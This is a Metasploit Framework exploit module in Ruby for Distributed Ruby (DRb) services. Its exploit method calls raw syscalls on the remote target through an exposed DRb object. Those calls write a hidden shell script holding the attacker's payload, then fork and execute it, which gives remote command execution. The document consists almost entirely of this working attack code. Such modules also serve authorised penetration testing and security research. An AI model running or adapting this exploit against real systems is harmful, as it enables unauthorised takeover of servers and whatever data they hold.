##
# This file is part of the Metasploit Framework and may be subject to 
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/projects/Framework/
##

require 'msf/core'
require 'drb/drb'
class Metasploit3 < Msf::Exploit::Remote

	def initialize(info = {})
		super(update_info(info,	
			'Name'           => 'Distributed Ruby send syscall vulnerability.',
			'Description'    => %q{ This module exploits remote syscalls in DRuby
			},
			'Author'         => [ 'joernchen <joernchen@phenoelit.de> (Phenoelit)' ],
			'License'        => MSF_LICENSE,
			'Version'        => '',
			'References'     =>
				[
				],
			'Privileged'     => false,
			'Payload'        =>
				{
					'DisableNops' => true,
					'Compat'      => 
						{
							'PayloadType' => 'cmd',
						},
					'Space'       => 32768,
				},
			'Platform'       => 'linux',
			'Arch'           => ARCH_ALL,
			'Targets'        => [[ 'Automatic', { }]],
			'DefaultTarget' => 0))

			
			register_options(
				[
					OptString.new('URI', [true, "The druby URI of the target host ", ""]),
				], self.class)
	end

	def exploit
		serveruri = datastore['URI'] 
		DRb.start_service	
		p = DRbObject.new_with_uri(serveruri)
		class << p
			undef :send
		end
		filename = "." + Rex::Text.rand_text_alphanumeric(16)
		# syscall open
		i =  p.send(:syscall,8,filename,0700)
		#syscall write
		p.send(:syscall,4,i,"#!/bin/sh\n" << payload.encoded,payload.encoded.length + 10)
		#syscall close
		p.send(:syscall,6,i)
		#syscall fork
		p.send(:syscall,2)
		#syscall execve
		p.send(:syscall,11,filename,0,0)
	
		handler(nil)
	end
end
